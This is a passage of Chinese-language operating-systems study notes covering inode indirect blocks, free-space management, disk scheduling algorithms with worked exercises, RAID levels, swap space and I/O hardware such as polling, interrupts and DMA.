KB的数据可以直接访问。其他3个指针指向间接块。第一个间接块指针为一级间接块的地址。一级间接块为索引块， 它包含的不是数据， 而是那些包含数据的块的地址。 接着是一个二级间接块指针， 它包含了 一个块的地址， 而这个块中的地址指向了一些块， 这些块中又包含了指向真实数据块的指针。 最后一个指针为三级间接块指针。 采用这种方法，一个文件的块数可以超过许多操作系统所使用的 4B 的文件指针所能访问的空间。 32 位指针只能访问 2<sup>32</sup> B， 即4GB。 许多 UNIX 如 Solaris 和 IBM AIX 现在支持高达 64 位的文件指针。 这样的指针允许文件和文件系统为数太字节。 图 11.9 显示了一个 UNIX 的inode。</li></ul><p><img src="/posts/8ce3e425/image-20220108152148247.png" alt="image-20220108152148247"></p><h3 id="1144-性能"><a class="markdownIt-Anchor" href="#1144-性能"></a> 11.4.4 性能</h3><h2 id="115-空闲空间管理"><a class="markdownIt-Anchor" href="#115-空闲空间管理"></a> 11.5 空闲空间管理</h2><p>为了记录空闲磁盘空间，系统需要维护一个空闲空间链表。 空闲空间链表记录了所有空闲磁盘空间， 即未分配给文件或目录的空间。 当创建文件时， 搜索空闲空间链表以得到所需要的空间， 并分配给新文件。 这些空间会从空闲空间链表中删除。 当删除文件时， 其磁盘空间会增加到空闲空间表上。 空闲空间链表虽然称为链表， 但不一定表现为链表。</p><h3 id="1151-位向量"><a class="markdownIt-Anchor" href="#1151-位向量"></a> 11.5.1 位向量</h3><p>空闲空间表实现为位图（bit map） 或位向量（bit vector）。 每块用一位表示。 如果一块为空闲， 那么其位为1：如果一块己分配， 那么其位为0。</p><p>例如， 假设有一个磁盘，其块 2 、 3、 4、 5、 8、9、 10、 11、 12、 13、 17、 18 、 25、 26、<br>27 为空闲， 其他块为己分配。 那么， 空闲空间位图如下：<br>001111001111110001100000011100000···</p><h3 id="1152-链表"><a class="markdownIt-Anchor" href="#1152-链表"></a> 11.5.2 链表</h3><p>空闲空间管理的另一种方法是将所有空闲磁盘块用链表连接起来， 并将指向第一空闲块的指针保存在磁盘的特殊位置， 同时也缓存在内存中。 第一块包含一个下一空闲磁盘块的指针， 如此继续下去。</p><p><img src="/posts/8ce3e425/image-20220108152927671.png" alt="image-20220108152927671"></p><h3 id="1153-组"><a class="markdownIt-Anchor" href="#1153-组"></a> 11.5.3 组</h3><p>对空闲链表的一个改进是将n个空闲块的地址存在第一个空闲块中。这些块中的前 n-1个确实为空， 而最后一块包含另外n个空闲块的地址， 如此继续。 大量空闲块的地址可以很快地找到， 这一点有别于标准链表方法。</p><h3 id="1154-计数"><a class="markdownIt-Anchor" href="#1154-计数"></a> 11.5.4 计数</h3><p>另外一种方法是利用这样一个事实： 通常， 有多个连续块需要同时分配或释放， 尤其是在使用连续分配和采用簇时更是如此。 因此， 不是记录n个空闲块的地址， 而是可以记录第一块的地址和紧跟第一块的连续的空闲块的数量 n。 这样， 空闲空间表的每个条目包括磁盘地址和数量。 虽然每个条目会比原来需要更多空间， 但是表的总长度会更短， 这是因为连续块的数量常常大于1。</p><h2 id="116-效率与性能"><a class="markdownIt-Anchor" href="#116-效率与性能"></a> 11.6 效率与性能</h2><h3 id="1161-效率"><a class="markdownIt-Anchor" href="#1161-效率"></a> 11.6.1 效率</h3><p>磁盘空间的有效使用主要取决于所使用的磁盘分配和目录管理算法。</p><h3 id="1162-性能"><a class="markdownIt-Anchor" href="#1162-性能"></a> 11.6.2 性能</h3><h2 id="习题-2"><a class="markdownIt-Anchor" href="#习题-2"></a> 习题</h2><h2 id="112"><a class="markdownIt-Anchor" href="#112"></a> 11.2</h2><blockquote><p>链接分配的一种变种中， 使用 FAT 把文件的所有块链接起来， 它的优点和缺点是什么？</p></blockquote><p>优点：改善了随机访问时间，因为通过读入 FAT 信息，磁头能找到任何块的位置。在访问存储在文件中间的块时，可以通过追踪存储在FATA中的指针来确定其位置，而不是以顺序方式访问文件的所有单个块以找到指向目标块的指针。通常，大部分FAT都可以缓存在内存中，因此指针可以通过内存访问来确定，而不必访问磁盘块。</p><p>缺点：如果不对 FAT 采用缓存，FAT 分配方案可能导致大量的磁头寻道时间。磁头必须移到卷的开头以便读入 FAT，寻找所需要块的位置，接着移到块本身的位置。在最坏的情况下，每块都需要两次移动。</p><h2 id="114"><a class="markdownIt-Anchor" href="#114"></a> 11.4</h2><blockquote><p>有一些文件系统允许磁盘空间在不同的粒度级别分配。 比如， 文件系统可以把 4KB的磁盘空间分配为一个 4KB 的块， 或者 8 个 512 B 的块。 可以怎样利用这种特性来改进性能？要支持这种特性需要对空闲空间管理机制做什么修改？</p></blockquote><p>这样的方案将减少内部碎片。如果一个文件是5KB，那么它可能位于一个4KB块和两个连续的512字节块。除了维护空闲块的位图外，还必须维护关于块内当前正在使用的子块的额外状态。定位器随后必须检查该额外状态以分配子块，并在所有子块空闲时合并子块以获得较大的块</p><h2 id="116"><a class="markdownIt-Anchor" href="#116"></a> 11.6</h2><blockquote><p>设想一个在磁盘上的系统的逻辑块和物理块的大小都为 512 B。假设每个文件的信息已经在内存中。 针对三种分配方法（连续分配、 链接分配和索引分配）， 分别回答下面的问题。<br>a. 逻辑地址到物理地址的映射是怎样进行的（对索引分配， 假设文件总是小于 512 块)？</p><p>b. 假设当前处在逻辑块 10 (最后访问的块是块 10）， 现在想访问逻辑块 4， 那么必须从磁盘上读多少个物理块？</p></blockquote><p>设Z为起始文件地址（块号）</p><p><strong>连续分配：</strong></p><p>a. 将逻辑地址除以512，X和Y为所得商和余数。将X添加到Z以获得物理块编号。Y是到那个块的位移</p><p>b. 1个物理块</p><p><strong>链接分配：</strong></p><p>a. 将逻辑物理地址除以511，X和Y为所得的商和余数，向下搜索链接列表（获得X+1个块）。Y+1是到最后一个物理块的位移。</p><p>b. 4个物理块</p><p><strong>索引分配：</strong></p><p>a. 将逻辑地址除以512，X和Y为所得商和余数。将索引块存储到内存中。物理块地址包含在位置X.Y处的索引块是所需物理块的位移</p><p>b. 2个物理块</p><h1 id="第12章-大容量存储器的结构"><a class="markdownIt-Anchor" href="#第12章-大容量存储器的结构"></a> 第12章 大容量存储器的结构</h1><h2 id="121-大容量存储器结构简介"><a class="markdownIt-Anchor" href="#121-大容量存储器结构简介"></a> 12.1 大容量存储器结构简介</h2><h3 id="1211-磁盘"><a class="markdownIt-Anchor" href="#1211-磁盘"></a> 12.1.1 磁盘</h3><p><img src="/posts/8ce3e425/image-20220108155656247.png" alt="image-20220108155656247"></p><p><strong>磁盘访问时间=</strong> <strong>寻道时间</strong> <strong>+</strong> <strong>旋转时间</strong> <strong>+</strong> <strong>传输时间</strong> <strong>+</strong> <strong>控制器开销</strong></p><h3 id="1212-磁带"><a class="markdownIt-Anchor" href="#1212-磁带"></a> 12.1.2 磁带</h3><h2 id="122-磁盘结构"><a class="markdownIt-Anchor" href="#122-磁盘结构"></a> 12.2 磁盘结构</h2><h2 id="123-磁盘附属"><a class="markdownIt-Anchor" href="#123-磁盘附属"></a> 12.3 磁盘附属</h2><h3 id="1231-主机附属存储"><a class="markdownIt-Anchor" href="#1231-主机附属存储"></a> 12.3.1 主机附属存储</h3><h3 id="1232-网络附属存储"><a class="markdownIt-Anchor" href="#1232-网络附属存储"></a> 12.3.2 网络附属存储</h3><h3 id="1233-存储区域网络"><a class="markdownIt-Anchor" href="#1233-存储区域网络"></a> 12.3.3 存储区域网络</h3><h2 id="124-磁盘调度"><a class="markdownIt-Anchor" href="#124-磁盘调度"></a> 12.4 磁盘调度</h2><p>操作系统的任务之一就是有效地使用硬件。 对磁盘驱动器来说， 满足这一要求意味着<br>要有较快的<strong>访问速度</strong>和较宽的<strong>磁盘带宽</strong>。</p><ul><li><strong>访问时间</strong>包括两个主要部分（参见12.1.1小节〉：寻道时间和旋转延迟。<ul><li><strong>寻道时间</strong>是磁臂将磁头移动到包含目标扇区的柱面的时间。</li><li><strong>旋转延迟</strong>是磁盘需要将目标扇区转动到磁头下的时间。</li></ul></li><li><strong>磁盘带宽</strong>是所传递的总的字节数除以从服务请求开始到最后传递结束时的总时间。 可以通过使用适当的访问顺序来调度磁盘I/O请求， 提高访问速度和带宽。</li></ul><h3 id="1241-fcfs调度"><a class="markdownIt-Anchor" href="#1241-fcfs调度"></a> 12.4.1 FCFS调度</h3><p>最简单的磁盘调度形式当然是<strong>先来先服务算法</strong> （<strong>FCFS</strong> ）。</p><p>如果磁头开始位于 53， 那么它将从 53 移到98， 接着再到 183、 37、 122、 14、 124、 65, 最后到 67， 总的磁头移动为640柱面</p><p><img src="/posts/8ce3e425/image-20220108160611838.png" alt="image-20220108160611838"></p><ul><li>**优点：**简单，公平；</li><li>**缺点：**效率不高，相邻两次请求可能会造成最内到最外的柱面寻道，使磁头反复移动，增加了服务时间，对机械也不利</li></ul><h3 id="1242-sstf调度"><a class="markdownIt-Anchor" href="#1242-sstf调度"></a> 12.4.2 SSTF调度</h3><p><strong>最短寻道时间优先算法</strong>（ shortest-seek-time-first <strong>SSTF</strong> ）：先处理靠近当前磁头位置的请求可能较为合理。</p><p>对于前面请求队列的例子， 与开始磁头位置（53） 最近的请求是位于柱面 65。 当位于柱面 65， 下个最近请求位于柱面 67。 从柱面 67， 由于柱面 37 比 98 还要近， 所以下次处理 37。 如此继续进行， 会处理位于柱面 14， 接着 98 、 122、 124， 最后处理 183 上的请求（参见图 12.5）。 这种调度算法所产生的磁头移动为 236 柱面， 约为 FCFS 调度算法所产生的磁头移动数量的三分之一 。</p><p><img src="/posts/8ce3e425/image-20220108160943048.png" alt="image-20220108160943048"></p><ul><li>**优点：**改善了磁盘平均服务时间；</li><li>**缺点：**造成某些访问请求长期等待得不到服务</li></ul><h3 id="1243-scan调度"><a class="markdownIt-Anchor" href="#1243-scan调度"></a> 12.4.3 SCAN调度</h3><p><strong>SCAN 算法</strong>， 磁臂从磁盘的一端向另一端移动，同时当磁头移过每个柱面时， 处理位于该柱面上的服务请求。 当到达另 一端时， 磁头改变移动方向， 处理继续。SCAN算法有时被称为<strong>电梯算法</strong>（elevator algorithm）， 因为磁头的行为就像大楼里面的电梯，先处理所有向上请求， 然后再处理相反方向请求。</p><p><img src="/posts/8ce3e425/image-20220108161631672.png" alt="image-20220108161631672"></p><ul><li>**优点：**克服了最短寻道优先的缺点，既考虑了距离，同时又考虑了方向</li></ul><h3 id="1244-c-scan调度"><a class="markdownIt-Anchor" href="#1244-c-scan调度"></a> 12.4.4 C-SCAN调度</h3><p><strong>C-SCAN</strong> （circular SCAN, C-SCAN）调度是SCAN调度的变种， 主要提供一个更为均匀的等待时间。与SCAN 一样，C-SCAN将磁头从磁盘一端移到磁盘的另一端， 随着移动不断地处理请求。不过，当磁头移到另 一端时， 它会马上返回到磁盘开始，返回时并不处理请求（参见图12.7）。C-SCAN调度算法基本上将柱面当做一个环链，以将最后的柱面和第一个柱面相连。</p><p><img src="/posts/8ce3e425/image-20220108161725922.png" alt="image-20220108161725922"></p><h3 id="1245-look调度"><a class="markdownIt-Anchor" href="#1245-look调度"></a> 12.4.5 LOOK调度</h3><p>通常，磁头只移动到一个方向上最远的请求为止。 接着， 它马上回头，而不是继续到磁盘的尽头。这种形式的SCAN和C-SCAN称为<strong>LOOK</strong>和<strong>C-LOOK调度</strong>， 这是因为它们在朝一个方向移动会看（look） 是否有请求（见图12.8）。</p><p><img src="/posts/8ce3e425/image-20220108161853784.png" alt="image-20220108161853784"></p><h3 id="1246-磁盘调度算法的选择"><a class="markdownIt-Anchor" href="#1246-磁盘调度算法的选择"></a> 12.4.6 磁盘调度算法的选择</h3><ul><li>SSTF较为普通且很有吸引力</li><li>SCAN和C-SCAN对磁盘负荷较大的系统会执行得更好，这是因为它不可能产生饥饿问题。</li><li>对于任何调度算法，性能依赖于请求的类型与数量</li><li>磁盘服务请求很大程度上受文件分配方法所影响（文件连续分配时磁头移动距离一般更短）</li><li>磁盘调度算法应作为一个操作系统的独立模块，这样如果有必要，它可以替换成另一个不同的算法。</li><li>SSTF或LOOK是比较合理的缺省算法。</li></ul><h2 id="125-磁盘管理"><a class="markdownIt-Anchor" href="#125-磁盘管理"></a> 12.5 磁盘管理</h2><h3 id="1251-磁盘格式化"><a class="markdownIt-Anchor" href="#1251-磁盘格式化"></a> 12.5.1 磁盘格式化</h3><p><strong>低级格式化</strong> (或物理格式化)：在磁盘能存储数据之前， 它必须分成扇区以便磁盘控制器能读和写。 低级格式化为磁盘的每个扇区采用特别的数据结构。</p><ul><li>每个扇区的数据结构通常由头、数据区域（通常为 512 B 大小）和尾部 组成。 头部和尾部包含了一些磁盘控制器所使用的信息， 如扇区号码和纠错代码（error-correcting code, ECC）。</li></ul><p>为了使用磁盘存储文件， 操作系统还需要将自己的数据结构记录在磁盘上。 这分为两步。</p><ul><li>第一步是将磁盘分为由一个或多个柱面组成的分区。操作系统可以将每个分区作为一个独立的磁盘。例如， 一个分区可以用来存储操作系统的可执行代码， 而其他分区用来存储用户数据。</li><li>在分区之后， 第二步是<strong>逻辑格式化</strong>（创建文件系统）。在这一步，操作系统将初始的文件系统数据结构存储到磁盘上。 这些数据结构包括空闲和己分配 的空间（FAT或者 inode）和一个初始为空的目录。</li></ul><p><img src="/posts/8ce3e425/image-20220108171332679.png" alt="image-20220108171332679"></p><h3 id="1252-引导块"><a class="markdownIt-Anchor" href="#1252-引导块"></a> 12.5.2 引导块</h3><p>初始化自举 程序很简单。 它初始化系统的各个方面， 从CPU寄存器到设备控制器和内存， 接着启动操作系统 。 为此， 自举程序应找到磁盘上的操作系统内核， 装入内存， 并转到起始地址， 从而开始操作系统的执行。</p><p>绝大多数系统只在启动 ROM中 保留一个很小的自举加载程序， 其作用是进一步从磁盘上调入 更为完整的自举程序。 这一 更为完整的自举程序可以容易地进行修改：新版本可写到磁盘上。 这个完整的自举程序保存在磁盘的启动块 上， 启动块位于磁盘的固定位置 。拥有启动分区的磁盘称为启动磁盘（boot disk），或系统磁盘（systemdisk）。</p><h3 id="1253-坏块"><a class="markdownIt-Anchor" href="#1253-坏块"></a> 12.5.3 坏块</h3><h2 id="126-交换空间管理"><a class="markdownIt-Anchor" href="#126-交换空间管理"></a> 12.6 交换空间管理</h2><h3 id="1261-交换空间的使用"><a class="markdownIt-Anchor" href="#1261-交换空间的使用"></a> 12.6.1 交换空间的使用</h3><p>实现交换的系统可以将交换空间用于保存整个进程映像， 包括代码段和数据段。</p><p>换页系统也可能只用交换空间以存储换出内存的页。</p><p>系统所需交换空间的量因此会受以下因素影响：物理内存的多少、 所支持虚拟内存的多少、 内存使用方式等。 它可以是数MB到数GB的磁盘空间。</p><h3 id="1262-交换空间位置"><a class="markdownIt-Anchor" href="#1262-交换空间位置"></a> 12.6.2 交换空间位置</h3><p>交换空间可有两个位置： 交换空间在普通文件系统上加以创建**（外部碎片）<strong>， 或者是在一个独立的磁盘分区上进行</strong>（内部碎片）**。</p><h3 id="1263-实例交换空间管理"><a class="markdownIt-Anchor" href="#1263-实例交换空间管理"></a> 12.6.3 实例：交换空间管理</h3><ul><li>4.3 BSD在进程启动的时候分配交换空间，用来保存文本段（代码段）和数据段内核使用交换映射来跟踪交换空间的使用</li><li>Solaris 2当页被强制换出内存的时候分配交换空间。</li></ul><h2 id="127-raid结构"><a class="markdownIt-Anchor" href="#127-raid结构"></a> 12.7 RAID结构</h2><p>多种磁盘组织技术， 通常统称为**磁盘冗余阵列（RAID）**技术， 通常用于提高性能和可靠性。</p><h3 id="1271-通过冗余改善可靠性"><a class="markdownIt-Anchor" href="#1271-通过冗余改善可靠性"></a> 12.7.1 通过冗余改善可靠性</h3><ul><li><p>如果只存储数据的一个拷贝，只要n个磁盘中的一个磁盘出错，数据就出现错误。因此n个磁盘的出错率大于1个磁盘的出错率。</p></li><li><p>可靠性问题的解决方法是引入冗余。</p><ul><li>最为简单（但最为昂贵） 的引入冗余的方法是复制每个磁盘。 这种技术称为镜像(mirroring）。 因此每个逻辑磁盘由两个物理磁盘组成， 每次写都要在两个磁盘上进行。 如果一个磁盘损坏， 那么可从另一磁盘中恢复。 只有在第一个损坏磁盘没有替换之前而第二个磁盘又出错， 那么数据才会丢失。</li></ul></li></ul><h3 id="1272-通过并行处理改善性能"><a class="markdownIt-Anchor" href="#1272-通过并行处理改善性能"></a> 12.7.2 通过并行处理改善性能</h3><p>对于多个磁盘， 通过在多个磁盘上分散数据， 可以改善传输率。最简单形式是， 数据分散是在多个磁盘上分散每个字节的各个位， 这种分散称为位级分散。</p><p>总之， 磁盘系统并行访问有两个主要目的：</p><ul><li>①通过负荷平衡， 增加了多个小访问（即页访问）的吞吐量。</li><li>②降低大访问的响应时间</li></ul><h3 id="1273-raid级别"><a class="markdownIt-Anchor" href="#1273-raid级别"></a> 12.7.3 RAID级别</h3><p>通过磁盘分散和 “ 奇偶 ” 位（下面将要讨论）可以提供多种方案以在低代价环境下提供冗余。 这<br>些方案有不同的性价折中，可分成不同级别，称为<strong>RAID级别</strong>。</p><p><img src="/posts/8ce3e425/image-20220108200057196.png" alt="image-20220108200057196"></p><ul><li><p><strong>RAID级别0</strong>：</p><ul><li>数据分块，即把数据分布在多个盘上，写性能好。</li><li>非冗余阵列、无冗余信息。</li><li>严格地说，它不属于RAID系列。</li></ul><p><img src="/posts/8ce3e425/image-20220108200332672.png" alt="image-20220108200332672"></p></li><li><p><strong>RAID级别1:</strong></p><ul><li>RAID级别1指磁盘镜像。</li><li>每当数据写入一个磁盘时，将该数据也写到另一个冗余盘，形成信息的两份复制品。</li></ul><p><img src="/posts/8ce3e425/image-20220108200532205.png" alt="image-20220108200532205"></p><ul><li><strong>RAID1特点：</strong><ul><li>读性能好。</li><li>可靠性很高。</li><li>最昂贵的解决方法，物理磁盘空间是逻辑磁盘空间的两倍。</li></ul></li></ul></li><li><p><strong>RAID0+1</strong></p><ul><li><strong>先分块后镜像</strong></li><li>先做两个RAID0，然后再做RAID1，因此RAID0+1允许坏多个盘，但只能在坏在同一个RAID0中，不允许两个RAID0都有坏盘</li></ul><p><img src="/posts/8ce3e425/image-20220108203505969.png" alt="image-20220108203505969"></p></li><li><p><strong>RAID1+0</strong></p><ul><li><strong>先镜像后分块</strong></li><li>先做RAID1，然后再做RAID0，因此RAID1+0允许坏多个盘，只要不是一对磁盘坏就可以。</li></ul><p><img src="/posts/8ce3e425/image-20220108203604834.png" alt="image-20220108203604834"></p></li><li><p><strong>Raid0+1和Raid1+0比较</strong></p><p>在RAID 1+0的情况下，当一块独立的物理磁盘故障后，由于有一块对应镜像磁盘保护数据（除非对应的特定镜像硬盘也同时发生故障），因此不会对性能带来影响，从而显著高于RAID 0+1的容错性。磁盘故障后的恢复成本RAID 1+0技术也远低于RAID 0+1。在RAID 1+0技术中只需要重建一块物理磁盘，而RAID 0+1技术必须重建由块中所有物理磁盘组成的虚拟磁盘，从这点也能够体现出RAID 1+0相对RAID 0+1的优势。</p></li><li><p><strong>RAID级别2:</strong></p><p><img src="/posts/8ce3e425/image-20220108201500262.png" alt="image-20220108201500262"></p><ul><li><strong>RAID2特点：</strong><ul><li>RAID级别2也称为内存方式的差错纠正代码结构。</li><li>并行存取，各个驱动器同步工作。</li><li>使用海明编码来进行错误检测和纠正，数据传输率高。</li><li>需要多个磁盘来存放海明校验码信息，冗余磁盘数量与数据磁盘数量的对数成正比。</li><li>是一种在多磁盘易出错环境中的有效选择。</li><li>并未被广泛应用，目前还没有商业化产品</li></ul></li></ul></li><li><p><strong>RAID级别3:</strong></p><ul><li>R位交叉奇偶校验盘阵列。</li><li>单盘容错并行传输：数据以位或字节交叉存储，奇偶校验信息存储在一台专用盘上。</li></ul><p><img src="/posts/8ce3e425/image-20220108201934015.png" alt="image-20220108201934015"></p><ul><li><p>RAID3读写特点：</p><ul><li>假定有4个数据盘和一个冗余盘。</li><li>读出数据，一共需要5次磁盘读操作。</li><li>写数据需要3次磁盘读和2次磁盘写操作。</li></ul><p><img src="/posts/8ce3e425/image-20220108202309032.png" alt="image-20220108202309032"></p></li><li><p><strong>RAID3特点：</strong></p><ul><li>将磁盘分组，读写要访问组中所有盘，每组中有一个盘作为校验盘。</li><li>校验盘一般采用奇偶校验。</li><li>简单理解：先将分布在各个数据盘上的一组数据加起来，将和存放在冗余盘上。一旦某一个盘出错，只要将冗余盘上的和减去所有正确盘上的数据，得到的差就是出错的盘上的数据。</li><li>缺点：恢复时间较长。</li></ul></li></ul></li><li><p><strong>RAID级别4:</strong></p><ul><li>专用奇偶校验独立存取盘阵列。</li><li>数据以块（块大小可变）交叉的方式存于各盘，奇偶校验信息存在一台专用盘上。</li></ul><p><img src="/posts/8ce3e425/image-20220108202537741.png" alt="image-20220108202537741"></p><ul><li><strong>RAID4特点：</strong><ul><li>冗余代价与RAID3相同。</li><li>访问数据的方法与RAID3不同。<ul><li>RAID4对数据的访问是按数据块（一般是一个扇区）进行的，也就是按磁盘进行的，每次是一个盘。 RAID3是一次一横条，而RAID4一次一竖条。所以RAID3常须访问阵列中所有的硬盘驱动器，而RAID4只须访问有用的硬盘驱动器。</li><li>这样读数据的速度大大提高了，但在写数据方面，需将从数据硬盘驱动器和校验硬盘驱动器中恢复出的旧数据与新数据通过异或运算，然后再将更新后的数据和检验位写入硬盘驱动器。</li></ul></li></ul></li></ul></li><li><p><strong>RAID级别5</strong></p><ul><li>块交叉分布式奇偶校验盘阵列。</li><li>数据以块交叉的方式存于各盘，无专用冗余盘，奇偶校验信息均匀分布在所有磁盘上。</li></ul><p><img src="/posts/8ce3e425/image-20220108202759467.png" alt="image-20220108202759467"></p><ul><li><strong>RAID5特点：</strong><ul><li><strong>RAID5</strong>的读出效率很高，写入效率一般，块式的集体访问效率不错。因为奇偶校验码在不同的磁盘上，所以提高了可靠性，允许单个磁盘出错。</li></ul></li></ul><p><img src="/posts/8ce3e425/image-20220108202836430.png" alt="image-20220108202836430"></p></li><li><p><strong>RAID级别6：</strong></p><ul><li>双维奇偶校验独立存取盘阵列。</li></ul><p><img src="/posts/8ce3e425/image-20220108203118196.png" alt="image-20220108203118196"></p><ul><li><strong>RAID6特点：</strong><ul><li>可容忍双盘出错。</li><li>RAID5的扩展，主要是用于要求数据绝对不能出错的场合。由于引入了第二种奇偶校验值，所以需要N+2个磁盘，同时对控制器的设计变得十分复杂，写入速度也不好，用于计算奇偶校验值和验证数据正确性所花费的时间比较多，造成了不必须的负载</li></ul></li></ul></li><li><p><strong>RAID级别7：</strong></p><ul><li>RAID7是在RAID6的基础上，采用了cache技术，它使得传输率和响应速度都有较大的提高。</li><li>一般采用cache分块大小和磁盘阵列中数据分块大小相同，即一块cache分块对应一块磁盘分块。</li><li>在写入时将数据分别写入两个独立的cache，这样即使其中有一个cache出故障，数据也不会丢失。写操作将直接在cache级响应，然后再转到磁盘阵列。</li><li>数据从cache写到磁盘阵列时，同一磁道的数据将在一次操作中完成，避免了不少块数据多次写的问题，提高了速度。在读出时，主机也是直接从cache中读出，而不是从阵列盘上读取，减少与磁盘读操作次数，这样比较充分地利用了磁盘带宽。</li></ul></li></ul><h2 id="习题-3"><a class="markdownIt-Anchor" href="#习题-3"></a> 习题</h2><h3 id="122"><a class="markdownIt-Anchor" href="#122"></a> 12.2</h3><blockquote><p>假设一个磁盘驱动器有5 000个柱面， 从0～4 999 。 驱动器正在为柱面143 的一个请求提供服务，且前面的一个服务请求是在柱面125 。 按FIFO顺序，即将到来的服务队列是86, 1470, 913, 1774, 948, 1509, 1022, 1750, 130<br>从现在磁头位置开始，按照下面的磁盘调度算法， 要满足队列中的服务要求磁头总的移动距离是多少？<br>a. FCFS<br>b. SSTF<br>c. SCAN<br>d. LOOK<br>e. C-SCAN<br>f. C-LOOK</p></blockquote><p>a. FCFS 的调度是143、 86、1470、913、1774、948、1509、1022、1750、130。总移动距离是 7081 。</p><p>b. SSTF 的调度是 143、130 、86、913、948、1022、1470、1509、1750， 1774。总移动距离是 1745。</p><p>c. SCAN 的调度是143 ， 913 , 948 , 1022, 1470, 1509， 1750, 1774 , 4999 ,130 , 86 。总移动距离是 9769 。</p><p>d. LOOK 的调度是 143 ， 913 , 948 , 1022, 1470, 1509，1750， 1774, 130 ,86 。 总移动距离是 3319 。</p><p>e. C-SCAN 的调度是 143 ，913 , 948 , 1022 ， 1470 ， 1509 , 1750 , 1774 ,4999 , 0,86 ，130。总移动距离是9813 。</p><p>f. C-LOOK 的调度是 143，913 , 948 , 1022，1470 , 1509 , 1750 , 1774 ,86，130 。总移动距离是3363 。</p><h3 id="128"><a class="markdownIt-Anchor" href="#128"></a> 12.8</h3><blockquote><p>对于读请求， RAID级别1是否有可能比RAID级别0性能好(没有冗余分散数据)？若有，试具体说明。</p></blockquote><p>是的，RAID级别1组织可以实现更好的读请求性能。当执行读取操作时，RAID级别1系统可以决定应访问块的两个副本中的哪一个以满足请求。此选择可能基于磁头的当前位置，因此，通过选择更接近目标的磁头，可以实现性能优化</p><h3 id="129"><a class="markdownIt-Anchor" href="#129"></a> 12.9</h3><blockquote><p>考虑RAID级别5包含5个磁盘， 4个磁盘的奇偶校验存储在第5个磁盘中。 按下面的执行需要访问多少个块？<br>a. 写1性能好<br>b. 写7个连续块数据</p></blockquote><p>a.写入一个数据块需要如下操作：读取奇偶校验块，读取存储在目标块中的旧数据，根据目标块的新旧内容之间的差异计算新的奇偶校验，以及奇偶校验块和目标块的写入。</p><p>b.假设七个连续的块从一个四个块的边界开始。通过写入7个连续的块，写入前4个块的奇偶块，读取8个块计算下4个块的奇偶，并将相应的奇偶块写入磁盘，可以执行7个连续的数据块的写入。</p><h1 id="第13章-io输入系统"><a class="markdownIt-Anchor" href="#第13章-io输入系统"></a> 第13章 I/O输入系统</h1><h2 id="131-概述"><a class="markdownIt-Anchor" href="#131-概述"></a> 13.1 概述</h2><p>I/O与计算</p><ul><li>在不同应用场景下 各有侧重 （上网 游戏 文本 聊天）</li></ul><p>I/O子系统的核心</p><ul><li>统一管理复杂且差异化的各类IO设备</li></ul><p>I/O设备技术发展的两个矛盾趋势</p><ul><li>标准化和多样性</li></ul><p>设备驱动程序</p><ul><li>为应用程序与操作系统提供同意的标准接口</li></ul><h2 id="132-io硬件"><a class="markdownIt-Anchor" href="#132-io硬件"></a> 13.2 I/O硬件</h2><h3 id="1330-基本概念"><a class="markdownIt-Anchor" href="#1330-基本概念"></a> 13.3.0 <strong>基本概念</strong></h3><ul><li><p><strong>总线</strong> (daisy chain or shared direct access)</p><ul><li>是一组线和一组严格定义的可以描述在线上传输信息的协议</li></ul></li><li><p><strong>端口</strong></p><ul><li>设备通过系统总线上的接口与CPU相连，接口电路中含有多种寄存器，CPU向设备读写数据实际上是向接口上的寄存器读写数据，这些寄存器称为I/O端口</li><li>I/O端口通常有4种寄存器，即状态寄存器、控制寄存器、数据输入寄存器与数据输出寄存器。<ul><li><strong>数据输入寄存器</strong>被主机读出以获取数据。</li><li><strong>数据输出寄存器</strong>被主机写入以发送数据。</li><li><strong>状态寄存器</strong>包含一些主机可读取的位（bit)。这些位指示各种状态， 例如，当前任务是否完成，数据输入寄存器中是否有数据可以读取，是否出现设备故障等。</li><li><strong>控制寄存器</strong>可以被主机用来向设备发送命令或改变设备状态。</li></ul></li><li>端口的<strong>编址方式</strong>有两种：统一编址和独立编址<ul><li>**统一编址：**外设端口地址占用内存空间，也被称为内存映射方式。</li><li>**独立编址：**外设端口地址不占用内存空间，有自己的I/O地址空间。CPU通过专门的指令来访问I/O地址空间。</li></ul></li></ul></li><li><p><strong>控制器</strong> (host adapter)</p><ul><li>用于操作端口、总线或设备的一组电子器件（如：硬盘 ，移动硬盘）</li></ul></li></ul><h3 id="1321-轮询"><a class="markdownIt-Anchor" href="#1321-轮询"></a> 13.2.1 轮询</h3><p>主机通过端口写出数据时，<strong>主机与控制器之间的交互过程</strong>：</p><ol><li>主机不断地读取忙位，直到该位被清除 (这个过程称为轮询，亦称忙等待-busy waiting)</li><li>主机设置命令寄存器中的写位并向数据输出寄存器中写入一个字节。</li><li>主机设置命令就绪位</li><li>当控制器注意到命令就绪位已被设置，则设置忙位。</li><li>控制器读取命令寄存器，并看到写入命令。它从数据输出寄存器中读取一个字节，并向设备执行I/O操作。</li><li>控制器清除命令就绪位，清除状态寄存器的故障位以表示设备I/O成功，清除忙位以表示完成。</li></ol><h3 id="1322-中断"><a class="markdownIt-Anchor" href="#1322-中断"></a> 13.2.2 中断</h3><p>CPU硬件有一条<strong>中断请求线</strong>（interrupt-request line, IRL），由I/O设备触发</p><ul><li>设备控制器通过中断请求线发送信号而引起中断，</li><li>CPU捕获中断并派遣到中断处理程序<ul><li>CPU执行完每条指令都将判断IRL</li></ul></li><li>中断处理程序通过处理设备来清除中断。</li></ul><p><strong>中断控制器</strong></p><ul><li>中断延迟处理(当系统进行关键处理时)</li><li>中断派遣</li><li>多级中断（中断具有优先级）</li></ul><p><strong>两种中断请求</strong>（ cup一般设置两根中断请求输入线来完成该功能）</p><ul><li>非屏蔽中断：不可拒绝的，主要用来处理如不可恢复内存错误等事件</li><li>可屏蔽中断：cpu可以响应，也可以不响应中断（例如：打印机）</li></ul><p><strong>中断优先级：</strong></p><ul><li>能够使CPU延迟处理低优先级中断而不屏蔽所有中断，这也可以让高优先级中断抢占低优先级中断处理。</li></ul><p><strong>中断的用途</strong></p><ul><li>中断机制用于处理各种异常，如被零除，访问一个受保护的或不存在的内存地址</li><li>系统调用的实现需要用到中断（软中断）</li><li>中断也可以用来管理内核的控制流</li></ul><h3 id="1323-直接内存访问"><a class="markdownIt-Anchor" href="#1323-直接内存访问"></a> 13.2.3 直接内存访问</h3><p><strong>用处：</strong></p><ul><li>用来避免处理大量数据移动时按字节来向控制器送入数据的问题<ul><li>以PIO（Programmed I/O）方式进行大数据量传输，效率过低</li></ul></li><li>进一步降低CPU负担，任务下放给专用处理器<ul><li>DMA（direct memory 